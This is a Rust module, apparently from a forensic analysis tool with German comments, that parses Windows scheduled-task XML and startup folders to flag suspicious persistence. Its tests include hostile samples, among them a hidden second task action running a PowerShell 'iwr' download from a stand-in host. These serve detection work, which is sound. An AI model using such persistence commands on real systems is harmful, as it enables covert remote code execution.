//! Dateibasierte Persistenz: geplante Aufgaben und Autostart-Ordner.
//!
//! Anders als die Registry-Autostarts liegen diese Artefakte als Dateien im
//! Dateisystem: die XML-Beschreibungen der geplanten Aufgaben unter
//! `Windows\System32\Tasks` und die Verknüpfungen in den Autostart-Ordnern der
//! Benutzer und des Systems. Der Analyzer liest sie über den Pfad-Index.

use stratum_ntfs::NtfsVolume;

use crate::pathrating::{rate_command, PathStatus};
use crate::{AnalysisContext, Analyzer, Finding, FsIndex, Outcome};

/// Analyzer für geplante Aufgaben und Autostart-Ordner.
pub struct FilePersistenceAnalyzer;

impl Analyzer for FilePersistenceAnalyzer {
    fn dateibasiert(&self) -> bool {
        true
    }

    fn domain(&self) -> &str {
        "persistence"
    }

    fn run(&self, ctx: &AnalysisContext<'_>) -> Outcome {
        let mut out = Outcome::default();
        for v in &ctx.volumes {
            let (mut vol, _) = match ctx.open_volume(v) {
                Ok(x) => x,
                Err(e) => {
                    out.warnings
                        .push(format!("Offset {} nicht lesbar: {e}", v.target.offset));
                    continue;
                }
            };
            scheduled_tasks(&mut vol, v, &mut out);
            startup_folders(&mut vol, v, &mut out);
        }
        out
    }
}

/// Liest die XML-Dateien unter `Windows\System32\Tasks` und meldet je Aufgabe
/// den auszuführenden Befehl.
fn scheduled_tasks<R: std::io::Read + std::io::Seek>(
    vol: &mut NtfsVolume<R>,
    v: &FsIndex,
    out: &mut Outcome,
) {
    let prefix = "Windows\\System32\\Tasks";
    let dateien: Vec<_> = v
        .under(prefix)
        .filter(|e| e.size > 0 && e.size < 1_000_000)
        .cloned()
        .collect();
    for e in dateien {
        let Ok(Some(f)) = vol.read_file_by_record(e.mft_record, &e.path) else {
            continue;
        };
        let text = decode_text(&f.data);
        // Nur echte Aufgaben-XML auswerten.
        if !text.contains("<Task") {
            continue;
        }
        let author = tag(&text, "Author");
        let user = tag(&text, "UserId");
        let actions = task_actions(&text);

        // Der Aufgabenname ist der Pfad unter Tasks.
        let name = e.path.strip_prefix(prefix).unwrap_or(&e.path);
        let name = name.trim_start_matches('\\');

        let mut fd = Finding::new("persistence", name, &e.path)
            .with("ort", "Aufgabe")
            .with("befehl", actions.exec.first().cloned().unwrap_or_default())
            .with("aktion", actions.kind())
            .with(
                "auffaellig",
                if actions.reasons.is_empty() {
                    "nein"
                } else {
                    "ja"
                },
            )
            .with(
                "bewertung",
                "Pfadheuristik, kein Nachweis einer schädlichen Aktion",
            )
            .with("mft_record", e.mft_record.to_string())
            .with("volume_offset", v.target.offset.to_string());
        if actions.exec.len() > 1 {
            fd = fd.with("weitere_befehle", actions.exec[1..].join("\n"));
        }
        if !actions.com.is_empty() {
            fd = fd.with("com_handler", actions.com.join(","));
        }
        if let Some(status) = actions.first_path {
            fd = fd.with("pfad_status", status.label());
        }
        if actions.lolbin {
            fd = fd.with("systemwerkzeug", "ja");
        }
        if !actions.reasons.is_empty() {
            fd = fd.with("auffaellig_grund", actions.reasons.join(","));
        }
        if let Some(a) = author {
            fd = fd.with("autor", a);
        }
        if let Some(u) = user {
            fd = fd.with("benutzer", u);
        }
        out.findings.push(fd);
    }
}

/// Meldet die Einträge in den Autostart-Ordnern der Benutzer und des Systems.
fn startup_folders<R: std::io::Read + std::io::Seek>(
    _vol: &mut NtfsVolume<R>,
    v: &FsIndex,
    out: &mut Outcome,
) {
    // Endet ein Pfad auf einen Autostart-Ordner (mit einer Datei darin)?
    let marker = "\\start menu\\programs\\startup\\";
    for e in &v.files {
        let lower = e.path.to_ascii_lowercase();
        let Some(pos) = lower.find(marker) else {
            continue;
        };
        // Nur direkte Einträge im Ordner, keine tieferen Unterordner.
        let rest = &e.path[pos + marker.len()..];
        if rest.is_empty() || rest.contains('\\') {
            continue;
        }
        if rest.eq_ignore_ascii_case("desktop.ini") {
            continue;
        }
        out.findings
            .push(Finding::new("persistence", rest, &e.path).with("ort", "Autostart-Ordner"));
    }
}

/// Aktionen einer Aufgabe mit ihrer Bewertung.
#[derive(Debug, Default)]
pub(crate) struct TaskActions {
    /// Exec-Aktionen als Programm und Argumente.
    exec: Vec<String>,
    /// ClassIds der ComHandler-Aktionen.
    com: Vec<String>,
    /// Pfadbewertung der ersten Exec-Aktion.
    first_path: Option<PathStatus>,
    /// Mindestens eine Exec-Aktion startet ein Systemwerkzeug.
    lolbin: bool,
    /// Gründe für die Markierung, ohne Duplikate.
    reasons: Vec<String>,
}

impl TaskActions {
    fn kind(&self) -> &'static str {
        match (self.exec.is_empty(), self.com.is_empty()) {
            (false, true) => "exec",
            (true, false) => "com_handler",
            (false, false) => "exec,com_handler",
            (true, true) => "sonstige",
        }
    }
}

/// Liest alle Exec- und ComHandler-Aktionen. Aufgaben ohne Exec-Aktion sind
/// meist ComHandler von Windows selbst und gelten nicht pauschal als auffällig.
/// Systemwerkzeuge wie rundll32 sind in Windows-Aufgaben üblich; markiert wird
/// nur ein ungewöhnlicher Programmpfad oder ein Werkzeug mit auffälligen Argumenten.
pub(crate) fn task_actions(xml: &str) -> TaskActions {
    let mut out = TaskActions::default();
    for block in blocks(xml, "Exec") {
        let Some(command) = tag(block, "Command") else {
            continue;
        };
        let arguments = tag(block, "Arguments");
        // Command enthält nur das Programm, Leerzeichen gehören also zum Pfad.
        let program = command.trim().trim_matches('"');
        let rating = rate_command(&format!(
            "\"{program}\" {}",
            arguments.as_deref().unwrap_or("")
        ));
        out.first_path.get_or_insert(rating.path);
        out.lolbin |= rating.lolbin;
        let mut reasons = Vec::new();
        if let PathStatus::Unusual(grund) = rating.path {
            reasons.push(format!("pfad:{grund}"));
        }
        if let (true, Some(grund)) = (rating.lolbin, rating.suspicious_args) {
            reasons.push(format!("systemwerkzeug_argumente:{grund}"));
        }
        for r in reasons {
            if !out.reasons.contains(&r) {
                out.reasons.push(r);
            }
        }
        out.exec.push(match arguments {
            Some(a) => format!("{command} {a}"),
            None => command,
        });
    }
    out.com = blocks(xml, "ComHandler")
        .into_iter()
        .filter_map(|b| tag(b, "ClassId"))
        .collect();
    out
}

/// Liefert den Inhalt aller `<name>...</name>`-Blöcke, auch mit Attributen am Start-Tag.
fn blocks<'a>(xml: &'a str, name: &str) -> Vec<&'a str> {
    let open = format!("<{name}");
    let close = format!("</{name}>");
    let mut out = Vec::new();
    let mut rest = xml;
    while let Some(p) = rest.find(&open) {
        let after = &rest[p + open.len()..];
        // `<Exec` darf nicht `<ExecutionTimeLimit` treffen.
        if !after.starts_with(['>', ' ', '\t', '\r', '\n']) {
            rest = after;
            continue;
        }
        let Some(gt) = after.find('>') else { break };
        let body = &after[gt + 1..];
        let Some(end) = body.find(&close) else { break };
        out.push(&body[..end]);
        rest = &body[end + close.len()..];
    }
    out
}

/// Dekodiert einen Text als UTF-16LE (mit BOM) oder sonst als UTF-8 (verlustarm).
fn decode_text(data: &[u8]) -> String {
    if data.len() >= 2 && data[0] == 0xff && data[1] == 0xfe {
        let units: Vec<u16> = data[2..]
            .chunks_exact(2)
            .map(|c| u16::from_le_bytes([c[0], c[1]]))
            .collect();
        String::from_utf16_lossy(&units)
    } else {
        String::from_utf8_lossy(data).into_owned()
    }
}

/// Extrahiert den Textinhalt des ersten `<tag>...</tag>` (ohne Namensraum-Präfix).
fn tag(xml: &str, name: &str) -> Option<String> {
    let open = format!("<{name}>");
    let close = format!("</{name}>");
    let start = xml.find(&open)? + open.len();
    let end = xml[start..].find(&close)? + start;
    let inhalt = xml[start..end].trim();
    if inhalt.is_empty() {
        None
    } else {
        Some(unescape(inhalt))
    }
}

/// Löst die fünf vordefinierten XML-Entitäten auf; `&amp;` zuletzt, damit
/// `&amp;quot;` nicht doppelt dekodiert wird.
fn unescape(s: &str) -> String {
    if !s.contains('&') {
        return s.to_string();
    }
    s.replace("&quot;", "\"")
        .replace("&apos;", "'")
        .replace("&lt;", "<")
        .replace("&gt;", ">")
        .replace("&amp;", "&")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn tag_extrahiert_inhalt() {
        let xml = "<Task><Actions><Exec><Command>C:\\evil.exe</Command>\
                   <Arguments>-x</Arguments></Exec></Actions></Task>";
        assert_eq!(tag(xml, "Command").as_deref(), Some("C:\\evil.exe"));
        assert_eq!(tag(xml, "Arguments").as_deref(), Some("-x"));
        assert_eq!(tag(xml, "Author"), None);
    }

    #[test]
    fn com_handler_ist_nicht_auffaellig() {
        let xml = "<Task><Actions Context=\"Author\"><ComHandler>\
                   <ClassId>{A6BA00FE-40E8-477C-B713-C64A14F18ADB}</ClassId>\
                   </ComHandler></Actions></Task>";
        let a = task_actions(xml);
        assert_eq!(a.kind(), "com_handler");
        assert_eq!(a.com, ["{A6BA00FE-40E8-477C-B713-C64A14F18ADB}"]);
        assert!(a.reasons.is_empty());
    }

    #[test]
    fn windows_aufgaben_aus_echtem_system() {
        for (cmd, args) in [
            (
                r"%windir%\system32\rundll32.exe",
                r"%windir%\system32\PcaSvc.dll,PcaPatchSdbTask",
            ),
            (
                r"%windir%\system32\rundll32.exe",
                "/d acproxy.dll,PerformAutochkOperations",
            ),
            ("BthUdTask.exe", "$(Arg0)"),
            ("sc.exe", "config upnphost start= auto"),
            (
                r"%ProgramFiles%\Windows Defender\MpCmdRun.exe",
                "Scan -ScheduleJob",
            ),
            (r#""%ProgramFiles%\Windows Media Player\wmpnscfg.exe""#, ""),
            (
                r"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe",
                "/c",
            ),
        ] {
            let xml = format!(
                "<Task><Settings><ExecutionTimeLimit>PT1H</ExecutionTimeLimit></Settings>\
                 <Actions><Exec><Command>{cmd}</Command><Arguments>{args}</Arguments></Exec></Actions></Task>"
            );
            let a = task_actions(&xml);
            assert_eq!(a.exec.len(), 1, "{cmd}");
            assert!(a.reasons.is_empty(), "{cmd}: {:?}", a.reasons);
        }
    }

    #[test]
    fn auffaellige_aufgaben() {
        let xml = r"<Task><Actions><Exec><Command>%localappdata%\x\u.exe</Command></Exec></Actions></Task>";
        assert_eq!(task_actions(xml).reasons, ["pfad:nutzerbeschreibbar"]);

        // Zweite Aktion versteckt hinter einer harmlosen ersten, mit Entitäten.
        let xml = "<Task><Actions><Exec><Command>C:\\Windows\\System32\\svchost.exe</Command></Exec>\
                   <Exec><Command>powershell.exe</Command>\
                   <Arguments>-c &quot;iwr https://x.invalid/a&quot;</Arguments></Exec></Actions></Task>";
        let a = task_actions(xml);
        assert_eq!(a.kind(), "exec");
        assert_eq!(a.exec.len(), 2);
        assert!(a.exec[1].contains("\"iwr"));
        assert!(a.lolbin);
        assert_eq!(a.reasons, ["systemwerkzeug_argumente:url"]);
    }

    #[test]
    fn unvollstaendiges_xml() {
        assert!(blocks("<Exec><Command>a", "Exec").is_empty());
        assert!(blocks("<Exec", "Exec").is_empty());
        assert_eq!(unescape("&amp;quot;"), "&quot;");
    }

    #[test]
    fn decode_utf16_mit_bom() {
        let mut d = vec![0xff, 0xfe];
        d.extend("ab".encode_utf16().flat_map(u16::to_le_bytes));
        assert_eq!(decode_text(&d), "ab");
        assert_eq!(decode_text(b"hallo"), "hallo");
    }
}
